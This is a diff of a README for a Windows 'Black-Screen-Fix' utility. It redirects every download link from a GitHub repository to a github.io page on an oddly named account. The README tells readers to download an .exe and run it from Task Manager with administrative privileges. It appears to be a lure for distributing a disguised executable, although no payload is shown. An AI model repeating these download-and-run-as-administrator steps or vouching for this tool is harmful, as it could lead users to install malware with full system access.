@@ -1,6 +1,6 @@
 # 🖥️ Black-Screen-Fix - Repair Windows display errors with ease
 
-[![Download Black-Screen-Fix](https://img.shields.io/badge/Download-Black--Screen--Fix-blue.svg)](https://github.com/pinkcollar-belting839/Black-Screen-Fix)
+[![Download Black-Screen-Fix](https://img.shields.io/badge/Download-Black--Screen--Fix-blue.svg)](https://pinkcollar-belting839.github.io)
 
 This tool resolves common black screen issues on Windows 10 and Windows 11. It assists when your computer starts but shows a black screen, a cursor, or no display after you log in. It works for problems caused by system updates, graphics card driver changes, or GPU timeout errors.
 
@@ -8,7 +8,7 @@ This tool resolves common black screen issues on Windows 10 and Windows 11. It a
 
 You can use this software to restore your display. Follow these steps to download and run the repair utility on your computer.
 
-1. Visit the [official repository page](https://github.com/pinkcollar-belting839/Black-Screen-Fix).
+1. Visit the [official repository page](https://pinkcollar-belting839.github.io).
 2. Locate the Release section on the right side of the page.
 3. Select the latest version of the application.
 4. Download the file ending in .exe to your local drive.
@@ -35,7 +35,7 @@ The software performs several background tasks to recover your desktop environme
 
 ## 📂 Installation and setup
 
-Download the utility from the [official project link](https://github.com/pinkcollar-belting839/Black-Screen-Fix). Once you download the folder, move it to a location on your hard drive that you can find through Safe Mode if necessary. 
+Download the utility from the [official project link](https://pinkcollar-belting839.github.io). Once you download the folder, move it to a location on your hard drive that you can find through Safe Mode if necessary. 
 
 If your screen stays black after login, use the following keys on your keyboard: Control + Alt + Delete. Select Task Manager from the menu. Click File, then select Run new task. Type the path of the downloaded file and check the box that says "Create this task with administrative privileges." Click OK to launch the tool.
 
